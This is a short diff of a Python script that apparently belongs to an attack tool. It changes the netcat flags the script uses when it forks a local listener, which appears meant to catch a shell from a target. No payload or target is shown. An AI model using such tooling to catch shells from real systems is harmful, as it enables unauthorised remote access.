@@ -68,8 +68,7 @@ if __name__ == "__main__":
         if pid > 0:
             print('[+] Forking a netcat listener')
             print('[+] Using ' + args.ncpath)
-            os.execv(args.ncpath, [args.ncpath, '-nvp -l ' + str(args.lport)])
-            #os.execv(args.ncpath, [args.ncpath, '-lvnp ' + str(args.lport)])
+            os.execv(args.ncpath, [args.ncpath, '-lvnp ' + str(args.lport)])
             sys.exit(0)
 
 
